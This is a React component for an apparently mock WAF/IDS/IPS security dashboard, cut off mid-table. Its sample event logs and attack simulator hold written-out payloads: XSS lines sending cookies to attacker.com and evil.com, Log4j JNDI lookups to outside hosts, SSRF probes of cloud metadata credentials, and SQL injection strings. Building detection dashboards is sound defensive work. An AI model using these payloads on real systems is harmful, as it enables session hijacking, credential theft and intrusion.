import React, { useState } from 'react';
import {
  ShieldCheck,
  ShieldAlert,
  Terminal,
  Activity,
  Zap,
  Lock,
  Globe,
  Radio,
  Filter,
  Search,
  CheckCircle2,
  AlertTriangle,
  RefreshCw,
  Plus,
  Play,
  Layers,
  Cpu,
  Server,
  ArrowRight,
  Eye,
  Trash2,
  Sliders,
  Sparkles,
  Ban,
  Download,
  Check,
  Copy
} from 'lucide-react';
import { useTheme } from '../context/ThemeContext';

export interface WafRule {
  id: string;
  ruleId: string;
  name: string;
  category: 'SQL_INJECTION' | 'XSS' | 'RCE_COMMAND' | 'PATH_TRAVERSAL' | 'SSRF' | 'BOT_CHALLENGE' | 'RATE_LIMIT';
  severity: 'CRITICAL' | 'HIGH' | 'MEDIUM' | 'LOW';
  action: 'BLOCK' | 'CHALLENGE' | 'LOG';
  enabled: boolean;
  matches24h: number;
  owaspReference: string;
}

export interface IdsIpsSignature {
  id: string;
  sid: number;
  name: string;
  protocol: 'TCP' | 'UDP' | 'ICMP' | 'DNS' | 'HTTP';
  mode: 'IPS_BLOCK' | 'IDS_ALERT';
  severity: 'CRITICAL' | 'HIGH' | 'MEDIUM' | 'LOW';
  category: 'EXPLOIT' | 'SCANNER' | 'C2_BEACON' | 'BRUTE_FORCE' | 'DOS_ATTACK';
  triggered24h: number;
  description: string;
}

export interface SecurityEventLog {
  id: string;
  timestamp: string;
  sourceIp: string;
  location: string;
  targetUri: string;
  attackType: string;
  engine: 'WAF' | 'IPS' | 'IDS';
  ruleMatched: string;
  actionTaken: 'BLOCKED_403' | 'CAPTCHA_CHALLENGED' | 'PACKET_DROPPED' | 'ALERT_LOGGED';
  severity: 'CRITICAL' | 'HIGH' | 'MEDIUM' | 'LOW';
  payloadSnippet: string;
}

export interface BlockedIpRecord {
  id: string;
  ipAddress: string;
  country: string;
  reason: string;
  bannedAt: string;
  ttlRemaining: string;
  threatScore: number;
}

const INITIAL_WAF_RULES: WafRule[] = [
  {
    id: 'waf-1',
    ruleId: 'OWASP-942100',
    name: 'SQL Injection Deep Pattern Detection',
    category: 'SQL_INJECTION',
    severity: 'CRITICAL',
    action: 'BLOCK',
    enabled: true,
    matches24h: 3420,
    owaspReference: 'OWASP Top 10 A03:2021 - Injection'
  },
  {
    id: 'waf-2',
    ruleId: 'OWASP-941100',
    name: 'Cross-Site Scripting (XSS) Vector Filter',
    category: 'XSS',
    severity: 'HIGH',
    action: 'BLOCK',
    enabled: true,
    matches24h: 1890,
    owaspReference: 'OWASP Top 10 A03:2021 - Injection'
  },
  {
    id: 'waf-3',
    ruleId: 'OWASP-932100',
    name: 'Remote Code Execution & Shell Command Injection',
    category: 'RCE_COMMAND',
    severity: 'CRITICAL',
    action: 'BLOCK',
    enabled: true,
    matches24h: 912,
    owaspReference: 'OWASP Top 10 A03:2021 - Injection'
  },
  {
    id: 'waf-4',
    ruleId: 'OWASP-930110',
    name: 'Path Traversal & Directory Disclosure (/etc/passwd)',
    category: 'PATH_TRAVERSAL',
    severity: 'HIGH',
    action: 'BLOCK',
    enabled: true,
    matches24h: 654,
    owaspReference: 'OWASP Top 10 A01:2021 - Broken Access Control'
  },
  {
    id: 'waf-5',
    ruleId: 'OWASP-934100',
    name: 'Server-Side Request Forgery (SSRF) Cloud Metadata Filter',
    category: 'SSRF',
    severity: 'CRITICAL',
    action: 'BLOCK',
    enabled: true,
    matches24h: 421,
    owaspReference: 'OWASP Top 10 A10:2021 - SSRF'
  },
  {
    id: 'waf-6',
    ruleId: 'WAF-BOT-901',
    name: 'Automated Headless Browser & AI Scraper Mitigation',
    category: 'BOT_CHALLENGE',
    severity: 'MEDIUM',
    action: 'CHALLENGE',
    enabled: true,
    matches24h: 14200,
    owaspReference: 'Automated Threat Mitigation'
  },
  {
    id: 'waf-7',
    ruleId: 'WAF-RATE-404',
    name: 'DDoS & HTTP Request Spike Rate Limiter (200 req/min)',
    category: 'RATE_LIMIT',
    severity: 'HIGH',
    action: 'BLOCK',
    enabled: true,
    matches24h: 8750,
    owaspReference: 'DoS / Rate Control'
  }
];

const INITIAL_IDS_SIGNATURES: IdsIpsSignature[] = [
  {
    id: 'sig-1',
    sid: 2024101,
    name: 'ET EXPLOIT Apache Log4j RCE (CVE-2021-44228) JNDI Lookup',
    protocol: 'TCP',
    mode: 'IPS_BLOCK',
    severity: 'CRITICAL',
    category: 'EXPLOIT',
    triggered24h: 412,
    description: 'Suricata eBPF rule intercepting LDAP JNDI strings in HTTP headers.'
  },
  {
    id: 'sig-2',
    sid: 2019482,
    name: 'GPL SCANNER Nmap Stealth SYN Port Scan Detected',
    protocol: 'TCP',
    mode: 'IPS_BLOCK',
    severity: 'HIGH',
    category: 'SCANNER',
    triggered24h: 3890,
    description: 'Detects rapid SYN packet probes across consecutive ports within 500ms.'
  },
  {
    id: 'sig-3',
    sid: 2038910,
    name: 'ET MALWARE Cobalt Strike Malleable HTTP C2 Beaconing',
    protocol: 'HTTP',
    mode: 'IPS_BLOCK',
    severity: 'CRITICAL',
    category: 'C2_BEACON',
    triggered24h: 88,
    description: 'Matched signature for suspicious recurring GET request headers.'
  },
  {
    id: 'sig-4',
    sid: 2003819,
    name: 'ET SCAN SSH Brute Force Login Attempt Pattern',
    protocol: 'TCP',
    mode: 'IPS_BLOCK',
    severity: 'HIGH',
    category: 'BRUTE_FORCE',
    triggered24h: 1240,
    description: 'Dynamic IP block after 5 failed SSH authentication handshakes in 30s.'
  },
  {
    id: 'sig-5',
    sid: 2049102,
    name: 'ET DOS Volumetric UDP Amplification Flood Probe',
    protocol: 'UDP',
    mode: 'IDS_ALERT',
    severity: 'MEDIUM',
    category: 'DOS_ATTACK',
    triggered24h: 6510,
    description: 'Monitors high-bandwidth NTP/DNS packet reflection anomalies.'
  }
];

const INITIAL_LOGS: SecurityEventLog[] = [
  {
    id: 'log-101',
    timestamp: 'Just now',
    sourceIp: '185.220.101.45',
    location: 'Frankfurt, DE',
    targetUri: '/api/v1/users?id=1%20UNION%20SELECT%20username,password_hash%20FROM%20admin_users',
    attackType: 'SQL Injection',
    engine: 'WAF',
    ruleMatched: 'OWASP-942100',
    actionTaken: 'BLOCKED_403',
    severity: 'CRITICAL',
    payloadSnippet: "' UNION SELECT 1,group_concat(table_name) FROM information_schema.tables--"
  },
  {
    id: 'log-102',
    timestamp: '1 min ago',
    sourceIp: '45.142.120.9',
    location: 'Moscow, RU',
    targetUri: '/login?next=<script>document.location="http://attacker.com/steal?"+document.cookie</script>',
    attackType: 'Cross-Site Scripting (XSS)',
    engine: 'WAF',
    ruleMatched: 'OWASP-941100',
    actionTaken: 'BLOCKED_403',
    severity: 'HIGH',
    payloadSnippet: '<script>fetch("http://evil.com/k?"+document.cookie)</script>'
  },
  {
    id: 'log-103',
    timestamp: '3 mins ago',
    sourceIp: '103.251.140.88',
    location: 'Beijing, CN',
    targetUri: 'TCP Port 443 -> /cgi-bin/vulnerable.py',
    attackType: 'Log4j JNDI RCE Probe',
    engine: 'IPS',
    ruleMatched: 'SURICATA-2024101',
    actionTaken: 'PACKET_DROPPED',
    severity: 'CRITICAL',
    payloadSnippet: '${jndi:ldap://103.251.140.88:1389/ExploitPayload}'
  },
  {
    id: 'log-104',
    timestamp: '5 mins ago',
    sourceIp: '194.26.29.114',
    location: 'Warsaw, PL',
    targetUri: '/api/v1/render?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/',
    attackType: 'SSRF Cloud Exfiltration',
    engine: 'WAF',
    ruleMatched: 'OWASP-934100',
    actionTaken: 'BLOCKED_403',
    severity: 'CRITICAL',
    payloadSnippet: 'http://169.254.169.254/latest/meta-data/identity-credentials'
  },
  {
    id: 'log-105',
    timestamp: '8 mins ago',
    sourceIp: '198.51.100.99',
    location: 'Virginia, US',
    targetUri: '/checkout/payment',
    attackType: 'Credential Stuffing Botnet',
    engine: 'WAF',
    ruleMatched: 'WAF-BOT-901',
    actionTaken: 'CAPTCHA_CHALLENGED',
    severity: 'MEDIUM',
    payloadSnippet: 'User-Agent: Mozilla/5.0 Python-urllib/3.10 HeadlessChrome'
  }
];

const INITIAL_BLOCKED_IPS: BlockedIpRecord[] = [
  {
    id: 'ip-1',
    ipAddress: '185.220.101.45',
    country: 'Frankfurt, DE',
    reason: 'Repeated SQL Injection & OWASP CRS 942100 Violations',
    bannedAt: '10 mins ago',
    ttlRemaining: '23h 50m',
    threatScore: 98
  },
  {
    id: 'ip-2',
    ipAddress: '45.142.120.9',
    country: 'Moscow, RU',
    reason: 'Automated Vulnerability Scanner & XSS Vector Probe',
    bannedAt: '45 mins ago',
    ttlRemaining: '23h 15m',
    threatScore: 92
  },
  {
    id: 'ip-3',
    ipAddress: '103.251.140.88',
    country: 'Beijing, CN',
    reason: 'Log4j Exploit & Cobalt Strike C2 Outbound Beaconing',
    bannedAt: '2 hours ago',
    ttlRemaining: '22h 00m',
    threatScore: 99
  },
  {
    id: 'ip-4',
    ipAddress: '194.26.29.114',
    country: 'Warsaw, PL',
    reason: 'SSRF Cloud Metadata Credentials Theft Attempt',
    bannedAt: '3 hours ago',
    ttlRemaining: '21h 00m',
    threatScore: 95
  }
];

export function IdsIpsWafView() {
  const { theme } = useTheme();
  const isLight = theme === 'light';

  // Sub-tabs: 'waf' | 'ids_ips' | 'logs' | 'ban_list'
  const [activeTab, setActiveTab] = useState<'waf' | 'ids_ips' | 'logs' | 'ban_list'>('waf');

  const [protectionMode, setProtectionMode] = useState<'BLOCKING' | 'DETECTION_ONLY'>('BLOCKING');
  const [wafRules, setWafRules] = useState<WafRule[]>(INITIAL_WAF_RULES);
  const [idsSignatures, setIdsSignatures] = useState<IdsIpsSignature[]>(INITIAL_IDS_SIGNATURES);
  const [eventLogs, setEventLogs] = useState<SecurityEventLog[]>(INITIAL_LOGS);
  const [blockedIps, setBlockedIps] = useState<BlockedIpRecord[]>(INITIAL_BLOCKED_IPS);

  // Search and Filter State
  const [searchQuery, setSearchQuery] = useState('');
  const [categoryFilter, setCategoryFilter] = useState('ALL');

  // Simulation State
  const [isSimulating, setIsSimulating] = useState(false);
  const [simulatedAttackType, setSimulatedAttackType] = useState<string | null>(null);

  // Custom IP Ban Modal State
  const [showBanModal, setShowBanModal] = useState(false);
  const [newBanIp, setNewBanIp] = useState('');
  const [newBanReason, setNewBanReason] = useState('');

  // Selected Log payload preview modal
  const [inspectLog, setInspectLog] = useState<SecurityEventLog | null>(null);

  const [copiedId, setCopiedId] = useState<string | null>(null);

  const handleToggleWafRule = (id: string) => {
    setWafRules((prev) =>
      prev.map((r) => (r.id === id ? { ...r, enabled: !r.enabled } : r))
    );
  };

  const handleActionChangeWaf = (id: string, action: 'BLOCK' | 'CHALLENGE' | 'LOG') => {
    setWafRules((prev) =>
      prev.map((r) => (r.id === id ? { ...r, action } : r))
    );
  };

  const handleToggleSignatureMode = (id: string) => {
    setIdsSignatures((prev) =>
      prev.map((s) =>
        s.id === id
          ? {
              ...s,
              mode: s.mode === 'IPS_BLOCK' ? 'IDS_ALERT' : 'IPS_BLOCK'
            }
          : s
      )
    );
  };

  const handleSimulateAttack = (type: 'SQLi' | 'XSS' | 'Log4j' | 'SSRF' | 'SYN_Flood') => {
    setIsSimulating(true);
    setSimulatedAttackType(type);

    setTimeout(() => {
      const newLog: SecurityEventLog = {
        id: `sim-${Date.now()}`,
        timestamp: 'Just now (Simulated)',
        sourceIp: `198.51.100.${Math.floor(Math.random() * 200 + 10)}`,
        location: 'Simulated Attack Node (Testing)',
        targetUri:
          type === 'SQLi'
            ? '/api/v1/auth?user=\' OR 1=1--'
            : type === 'XSS'
            ? '/comments?body=<svg onload=alert(document.cookie)>'
            : type === 'Log4j'
            ? '/api/v1/header?x-api-version=${jndi:dns://malicious.net}'
            : type === 'SSRF'
            ? '/proxy?url=http://168.63.129.16/aws/meta'
            : 'TCP Port 80 SYN Packet Stream (100k pps)',
        attackType:
          type === 'SQLi'
            ? 'SQL Injection (Simulated)'
            : type === 'XSS'
            ? 'Cross-Site Scripting (Simulated)'
            : type === 'Log4j'
            ? 'Log4j JNDI RCE (Simulated)'
            : type === 'SSRF'
            ? 'SSRF Metadata Probe (Simulated)'
            : 'Volumetric SYN Flood (Simulated)',
        engine: type === 'SYN_Flood' || type === 'Log4j' ? 'IPS' : 'WAF',
        ruleMatched:
          type === 'SQLi'
            ? 'OWASP-942100'
            : type === 'XSS'
            ? 'OWASP-941100'
            : type === 'Log4j'
            ? 'SURICATA-2024101'
            : type === 'SSRF'
            ? 'OWASP-934100'
            : 'SURICATA-2019482',
        actionTaken: protectionMode === 'BLOCKING' ? 'BLOCKED_403' : 'ALERT_LOGGED',
        severity: 'CRITICAL',
        payloadSnippet:
          type === 'SQLi'
            ? "' OR '1'='1"
            : type === 'XSS'
            ? "<svg/onload=alert(1)>"
            : type === 'Log4j'
            ? "${jndi:ldap://simulated-c2/a}"
            : "http://169.254.169.254/"
      };

      setEventLogs((prev) => [newLog, ...prev]);
      setIsSimulating(false);
      setSimulatedAttackType(null);
    }, 800);
  };

  const handleUnbanIp = (id: string) => {
    setBlockedIps((prev) => prev.filter((ip) => ip.id !== id));
  };

  const handleAddBanIp = () => {
    if (!newBanIp.trim()) return;
    const newRecord: BlockedIpRecord = {
      id: `ban-${Date.now()}`,
      ipAddress: newBanIp.trim(),
      country: 'Manual Block',
      reason: newBanReason.trim() || 'Manual Security Analyst Ban',
      bannedAt: 'Just now',
      ttlRemaining: '24h 00m',
      threatScore: 99
    };
    setBlockedIps((prev) => [newRecord, ...prev]);
    setNewBanIp('');
    setNewBanReason('');
    setShowBanModal(false);
  };

  const handleCopy = (id: string, text: string) => {
    navigator.clipboard.writeText(text);
    setCopiedId(id);
    setTimeout(() => setCopiedId(null), 2000);
  };

  const filteredWafRules = wafRules.filter((r) => {
    const matchesSearch =
      r.name.toLowerCase().includes(searchQuery.toLowerCase()) ||
      r.ruleId.toLowerCase().includes(searchQuery.toLowerCase()) ||
      r.owaspReference.toLowerCase().includes(searchQuery.toLowerCase());
    const matchesCategory = categoryFilter === 'ALL' || r.category === categoryFilter;
    return matchesSearch && matchesCategory;
  });

  return (
    <div className="flex flex-col flex-1 h-full overflow-y-auto bg-blue-50/30 text-slate-800">
      {/* Top Banner Header */}
      <div className="p-4 border-b flex flex-wrap items-center justify-between gap-4 bg-white border-blue-100 shadow-xs">
        <div className="flex items-center gap-3">
          <div className="p-2.5 bg-gradient-to-br from-blue-600 to-indigo-600 rounded-xl shadow-md text-white">
            <ShieldCheck className="w-6 h-6" />
          </div>
          <div>
            <div className="flex items-center gap-2">
              <h2 className="text-base font-bold tracking-tight text-slate-900">
                Next-Gen WAF • IDS • IPS Security Shield
              </h2>
              <span className={`px-2 py-0.5 rounded-full text-[10px] font-mono font-bold uppercase border ${
                protectionMode === 'BLOCKING'
                  ? 'bg-emerald-100 text-emerald-700 border-emerald-200'
                  : 'bg-amber-100 text-amber-700 border-amber-200'
              }`}>
                Mode: {protectionMode === 'BLOCKING' ? 'Active Auto-Blocking' : 'Detection Alert-Only'}
              </span>
            </div>
            <p className="text-xs text-slate-500">
              Layer 3-7 Deep Packet Inspection (DPI), Suricata eBPF Network Sensors, and OWASP CRS v4.0 WAF Rules.
            </p>
          </div>
        </div>

        {/* Protection Mode Toggle & Live Attack Simulator */}
        <div className="flex flex-wrap items-center gap-2">
          <div className="flex items-center gap-1.5 p-1 rounded-lg border bg-slate-100 border-slate-200">
            <button
              onClick={() => setProtectionMode('BLOCKING')}
              className={`px-3 py-1 rounded text-xs font-bold transition-all cursor-pointer ${
                protectionMode === 'BLOCKING'
                  ? 'bg-blue-600 text-white shadow-2xs'
                  : 'text-slate-600 hover:text-slate-900'
              }`}
            >
              Active IPS / WAF Block
            </button>
            <button
              onClick={() => setProtectionMode('DETECTION_ONLY')}
              className={`px-3 py-1 rounded text-xs font-bold transition-all cursor-pointer ${
                protectionMode === 'DETECTION_ONLY'
                  ? 'bg-amber-600 text-white shadow-2xs'
                  : 'text-slate-600 hover:text-slate-900'
              }`}
            >
              IDS Alert Only
            </button>
          </div>
        </div>
      </div>

      <div className="p-2.5 space-y-2.5 max-w-none w-full">
        {/* Metric Cards Ribbon */}
        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-5 gap-2.5">
          {/* Total Ingress Requests */}
          <div className="p-3 py-2 rounded-lg border bg-white border-blue-100 shadow-xs">
            <div className="flex items-center justify-between">
              <span className="text-[10px] font-bold uppercase tracking-wider text-blue-700">Total Ingress Monitored</span>
              <Activity className="w-3.5 h-3.5 text-blue-600" />
            </div>
            <div className="text-lg font-black mt-0.5 text-slate-900">5,892,100</div>
            <span className="text-[9.5px] text-blue-600 font-medium block truncate">
              4.2 Gbps Bandwidth • 1.1ms Latency
            </span>
          </div>

          {/* WAF Threats Intercepted */}
          <div className="p-3 py-2 rounded-lg border bg-white border-rose-100 shadow-xs">
            <div className="flex items-center justify-between">
              <span className="text-[10px] font-bold uppercase tracking-wider text-rose-700">WAF Blocked Threats</span>
              <ShieldAlert className="w-3.5 h-3.5 text-rose-600" />
            </div>
            <div className="text-lg font-black mt-0.5 text-slate-900">30,346</div>
            <span className="text-[9.5px] text-rose-600 font-medium block truncate">
              SQLi • XSS • RCE • Path Traversal
            </span>
          </div>

          {/* IDS / IPS Suricata Rules */}
          <div className="p-3 py-2 rounded-lg border bg-white border-indigo-100 shadow-xs">
            <div className="flex items-center justify-between">
              <span className="text-[10px] font-bold uppercase tracking-wider text-indigo-700">IPS Suricata Drops</span>
              <Cpu className="w-3.5 h-3.5 text-indigo-600" />
            </div>
            <div className="text-lg font-black mt-0.5 text-slate-900">12,044</div>
            <span className="text-[9.5px] text-indigo-600 font-medium block truncate">
              eBPF Kernel Drop • Log4j & Scanners
            </span>
          </div>

          {/* Active Banned IPs */}
          <div className="p-3 py-2 rounded-lg border bg-white border-amber-100 shadow-xs">
            <div className="flex items-center justify-between">
              <span className="text-[10px] font-bold uppercase tracking-wider text-amber-700">Dynamic IP Ban List</span>
              <Ban className="w-3.5 h-3.5 text-amber-600" />
            </div>
            <div className="text-lg font-black mt-0.5 text-slate-900">{blockedIps.length} Active IPs</div>
            <span className="text-[9.5px] text-amber-600 font-medium block truncate">
              Automated 24h Firewall Drops
            </span>
          </div>

          {/* TLS SSL Inspection */}
          <div className="p-3 py-2 rounded-lg border bg-white border-emerald-100 shadow-xs">
            <div className="flex items-center justify-between">
              <span className="text-[10px] font-bold uppercase tracking-wider text-emerald-700">TLS 1.3 Inspection</span>
              <Lock className="w-3.5 h-3.5 text-emerald-600" />
            </div>
            <div className="text-lg font-black mt-0.5 text-slate-900">100% Decrypted</div>
            <span className="text-[9.5px] text-emerald-600 font-medium block truncate">
              Hardware Offloaded Crypto Engine
            </span>
          </div>
        </div>

        {/* Attack Simulator & Test Toolbar */}
        <div className={`p-3 rounded-xl border flex flex-wrap items-center justify-between gap-3 ${
          isLight ? 'bg-indigo-50/60 border-indigo-200' : 'bg-indigo-950/30 border-indigo-900/50'
        }`}>
          <div className="flex items-center gap-2">
            <Sparkles className="w-4 h-4 text-indigo-600 dark:text-indigo-400" />
            <span className="text-xs font-bold text-indigo-900 dark:text-indigo-200">
              Real-Time Security Rule Testing Sandbox:
            </span>
            <span className="text-[11px] text-indigo-700 dark:text-indigo-300">
              Dispatch simulated exploits to verify active WAF & IPS rule enforcement.
            </span>
          </div>

          <div className="flex flex-wrap items-center gap-1.5">
            <button
              onClick={() => handleSimulateAttack('SQLi')}
              disabled={isSimulating}
              className="px-2.5 py-1 rounded-lg text-xs font-bold bg-rose-600 hover:bg-rose-500 text-white transition-all cursor-pointer flex items-center gap-1 shadow-2xs"
            >
              {isSimulating && simulatedAttackType === 'SQLi' ? <RefreshCw className="w-3 h-3 animate-spin" /> : <Play className="w-3 h-3" />}
              <span>Test SQLi Attack</span>
            </button>

            <button
              onClick={() => handleSimulateAttack('XSS')}
              disabled={isSimulating}
              className="px-2.5 py-1 rounded-lg text-xs font-bold bg-purple-600 hover:bg-purple-500 text-white transition-all cursor-pointer flex items-center gap-1 shadow-2xs"
            >
              {isSimulating && simulatedAttackType === 'XSS' ? <RefreshCw className="w-3 h-3 animate-spin" /> : <Play className="w-3 h-3" />}
              <span>Test XSS Payload</span>
            </button>

            <button
              onClick={() => handleSimulateAttack('Log4j')}
              disabled={isSimulating}
              className="px-2.5 py-1 rounded-lg text-xs font-bold bg-amber-600 hover:bg-amber-500 text-white transition-all cursor-pointer flex items-center gap-1 shadow-2xs"
            >
              {isSimulating && simulatedAttackType === 'Log4j' ? <RefreshCw className="w-3 h-3 animate-spin" /> : <Play className="w-3 h-3" />}
              <span>Test Log4j JNDI RCE</span>
            </button>

            <button
              onClick={() => handleSimulateAttack('SSRF')}
              disabled={isSimulating}
              className="px-2.5 py-1 rounded-lg text-xs font-bold bg-cyan-600 hover:bg-cyan-500 text-white transition-all cursor-pointer flex items-center gap-1 shadow-2xs"
            >
              {isSimulating && simulatedAttackType === 'SSRF' ? <RefreshCw className="w-3 h-3 animate-spin" /> : <Play className="w-3 h-3" />}
              <span>Test SSRF Probe</span>
            </button>

            <button
              onClick={() => handleSimulateAttack('SYN_Flood')}
              disabled={isSimulating}
              className="px-2.5 py-1 rounded-lg text-xs font-bold bg-indigo-600 hover:bg-indigo-500 text-white transition-all cursor-pointer flex items-center gap-1 shadow-2xs"
            >
              {isSimulating && simulatedAttackType === 'SYN_Flood' ? <RefreshCw className="w-3 h-3 animate-spin" /> : <Play className="w-3 h-3" />}
              <span>Test SYN Flood</span>
            </button>
          </div>
        </div>

        {/* Operational Dashboard Tabs Bar */}
        <div className={`p-3 rounded-xl border space-y-3 ${isLight ? 'bg-white border-slate-200 shadow-xs' : 'bg-slate-900 border-slate-800'}`}>
          <div className="flex flex-wrap items-center justify-between gap-3 border-b border-slate-200 dark:border-slate-800 pb-2">
            <div className="flex items-center gap-1.5 overflow-x-auto">
              <button
                onClick={() => setActiveTab('waf')}
                className={`px-3.5 py-2 rounded-t-lg text-xs font-bold transition-all cursor-pointer flex items-center gap-2 border-b-2 ${
                  activeTab === 'waf'
                    ? 'bg-slate-200/90 dark:bg-slate-800 text-rose-600 dark:text-rose-400 border-rose-600 dark:border-rose-400 shadow-2xs font-extrabold'
                    : 'bg-slate-100/60 dark:bg-slate-800/40 text-slate-500 dark:text-slate-400 hover:bg-slate-200/70 hover:text-slate-800 dark:hover:bg-slate-800 dark:hover:text-slate-200 border-transparent'
                }`}
              >
                <ShieldAlert className={`w-4 h-4 ${activeTab === 'waf' ? 'text-rose-500 dark:text-rose-400' : 'text-slate-500'}`} />
                <span>WAF Engine & OWASP Rules ({wafRules.length})</span>
              </button>
 
              <button
                onClick={() => setActiveTab('ids_ips')}
                className={`px-3.5 py-2 rounded-t-lg text-xs font-bold transition-all cursor-pointer flex items-center gap-2 border-b-2 ${
                  activeTab === 'ids_ips'
                    ? 'bg-slate-200/90 dark:bg-slate-800 text-rose-600 dark:text-rose-400 border-rose-600 dark:border-rose-400 shadow-2xs font-extrabold'
                    : 'bg-slate-100/60 dark:bg-slate-800/40 text-slate-500 dark:text-slate-400 hover:bg-slate-200/70 hover:text-slate-800 dark:hover:bg-slate-800 dark:hover:text-slate-200 border-transparent'
                }`}
              >
                <Cpu className={`w-4 h-4 ${activeTab === 'ids_ips' ? 'text-rose-500 dark:text-rose-400' : 'text-slate-500'}`} />
                <span>IDS / IPS Network Sensor ({idsSignatures.length})</span>
              </button>
 
              <button
                onClick={() => setActiveTab('logs')}
                className={`px-3.5 py-2 rounded-t-lg text-xs font-bold transition-all cursor-pointer flex items-center gap-2 border-b-2 ${
                  activeTab === 'logs'
                    ? 'bg-slate-200/90 dark:bg-slate-800 text-rose-600 dark:text-rose-400 border-rose-600 dark:border-rose-400 shadow-2xs font-extrabold'
                    : 'bg-slate-100/60 dark:bg-slate-800/40 text-slate-500 dark:text-slate-400 hover:bg-slate-200/70 hover:text-slate-800 dark:hover:bg-slate-800 dark:hover:text-slate-200 border-transparent'
                }`}
              >
                <Terminal className={`w-4 h-4 ${activeTab === 'logs' ? 'text-rose-500 dark:text-rose-400' : 'text-slate-500'}`} />
                <span>Live Interception Logs ({eventLogs.length})</span>
              </button>
 
              <button
                onClick={() => setActiveTab('ban_list')}
                className={`px-3.5 py-2 rounded-t-lg text-xs font-bold transition-all cursor-pointer flex items-center gap-2 border-b-2 ${
                  activeTab === 'ban_list'
                    ? 'bg-slate-200/90 dark:bg-slate-800 text-rose-600 dark:text-rose-400 border-rose-600 dark:border-rose-400 shadow-2xs font-extrabold'
                    : 'bg-slate-100/60 dark:bg-slate-800/40 text-slate-500 dark:text-slate-400 hover:bg-slate-200/70 hover:text-slate-800 dark:hover:bg-slate-800 dark:hover:text-slate-200 border-transparent'
                }`}
              >
                <Ban className={`w-4 h-4 ${activeTab === 'ban_list' ? 'text-rose-500 dark:text-rose-400' : 'text-slate-500'}`} />
                <span>Dynamic Banned IPs ({blockedIps.length})</span>
              </button>
            </div>

            {activeTab === 'ban_list' && (
              <button
                onClick={() => setShowBanModal(true)}
                className="px-3 py-1.5 rounded-lg text-xs font-bold bg-amber-600 hover:bg-amber-500 text-white transition-all cursor-pointer flex items-center gap-1.5 shadow-2xs"
              >
                <Plus className="w-3.5 h-3.5" />
                <span>Add IP to Blocklist</span>
              </button>
            )}
          </div>

          {/* TAB 1: WAF ENGINE & OWASP RULES */}
          {activeTab === 'waf' && (
            <div className="space-y-3">
              <div className="flex flex-wrap items-center justify-between gap-3">
                <div className="relative flex-1 min-w-[240px]">
                  <Search className="w-4 h-4 absolute left-3 top-1/2 -translate-y-1/2 text-slate-400" />
                  <input
                    type="text"
                    placeholder="Search WAF rules (OWASP-942100, SQLi, SSRF, XSS)..."
                    value={searchQuery}
                    onChange={(e) => setSearchQuery(e.target.value)}
                    className={`w-full pl-9 pr-3 py-1.5 text-xs rounded-lg border font-mono ${
                      isLight
                        ? 'bg-slate-50 border-slate-200 text-slate-900 focus:bg-white focus:border-indigo-500'
                        : 'bg-slate-900 border-slate-800 text-slate-200 focus:border-indigo-500'
                    } focus:outline-none`}
                  />
                </div>

                <div className="flex items-center gap-2">
                  <span className="text-xs font-semibold text-slate-500 text-[11px]">Category:</span>
                  <select
                    value={categoryFilter}
                    onChange={(e) => setCategoryFilter(e.target.value)}
                    className={`px-3 py-1.5 text-xs rounded-lg border font-semibold ${
                      isLight ? 'bg-slate-50 border-slate-200 text-slate-800' : 'bg-slate-900 border-slate-800 text-slate-200'
                    } focus:outline-none`}
                  >
                    <option value="ALL">All Rule Categories</option>
                    <option value="SQL_INJECTION">SQL Injection</option>
                    <option value="XSS">Cross-Site Scripting</option>
                    <option value="RCE_COMMAND">Remote Code Execution</option>
                    <option value="PATH_TRAVERSAL">Path Traversal</option>
                    <option value="SSRF">SSRF Mitigation</option>
                    <option value="BOT_CHALLENGE">Bot Challenge</option>
                    <option value="RATE_LIMIT">Rate Limiter</option>
                  </select>
                </div>
              </div>

              {/* Rules Table */}
              <div className="overflow-x-auto border rounded-xl border-slate-200 dark:border-slate-800">
                <table className="w-full text-left border-collapse">
                  <thead>
                    <tr className={`text-[11px] font-bold uppercase tracking-wider border-b ${
                      isLight ? 'bg-slate-100 text-slate-600 border-slate-200' : 'bg-slate-900 text-slate-400 border-slate-800'
                    }`}>
                      <th className="p-3">Status</th>
                      <th className="p-3 font-mono">Rule ID</th>
                      <th className="p-3">Rule Name & OWASP Reference</th>
                      <th className="p-3">Category</th>
                      <th className="p-3">Severity</th>
                      <th className="p-3">Action Enforced</th>
                      <th className="p-3 text-right">24h Interceptions</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-slate-200 dark:divide-slate-800 text-xs">
                    {filteredWafRules.map((rule) => (
                      <tr key={rule.id} className={`transition-colors ${isLight ? 'hover:bg-slate-50' : 'hover:bg-slate-900/60'}`}>
                        <td className="p-3">
                          <button
                            onClick={() => handleToggleWafRule(rule.id)}
                            className={`w-9 h-5 rounded-full p-0.5 transition-colors cursor-pointer flex items-center ${
                              rule.enabled ? 'bg-emerald-600 justify-end' : 'bg-slate-400 justify-start'
                            }`}
                          >
                            <span className="w-4 h-4 rounded-full bg-white shadow-2xs" />
                          </button>
                        </td>

                        <td className="p-3 font-mono font-bold text-indigo-600 dark:text-indigo-400">
                          {rule.ruleId}
                        </td>

                        <td className="p-3">
                          <div className={`font-bold ${isLight ? 'text-slate-900' : 'text-slate-100'}`}>
                            {rule.name}
                          </div>
                          <div className="text-[10px] text-slate-500 font-mono">
                            {rule.owaspReference}
                          </div>
                        </td>

                        <td className="p-3 font-mono text-[11px]">
                          <span className="px-2 py-0.5 rounded bg-slate-100 dark:bg-slate-800 text-slate-700 dark:text-slate-300 border border-slate-200 dark:border-slate-700">
                            {rule.category}
                          </span>
                        </td>

                        <td className="p-3 font-mono text-[10px] font-bold">
                          <span className={`px-2 py-0.5 rounded ${
                            rule.severity === 'CRITICAL' ? 'bg-rose-100 text-rose-800 dark:bg-rose-950 dark:text-rose-300 border border-rose-300 dark:border-rose-800' :
                            rule.severity === 'HIGH' ? 'bg-amber-100 text-amber-800 dark:bg-amber-950 dark:text-amber-300 border border-amber-300 dark:border-amber-800' :
                            'bg-blue-100 text-blue-800 dark:bg-blue-950 dark:text-blue-300 border border-blue-300 dark:border-blue-800'
                          }`}>
                            {rule.severity}
                          </span>
                        </td>

                        <td className="p-3">
                          <select
                            value={rule.action}
                            onChange={(e) => handleActionChangeWaf(rule.id, e.target.value as any)}
                            className={`px-2 py-1 text-xs rounded border font-bold ${
                              rule.action === 'BLOCK' ? 'bg-rose-100 text-rose-900 border-rose-300 dark:bg-rose-950 dark:text-rose-200' :
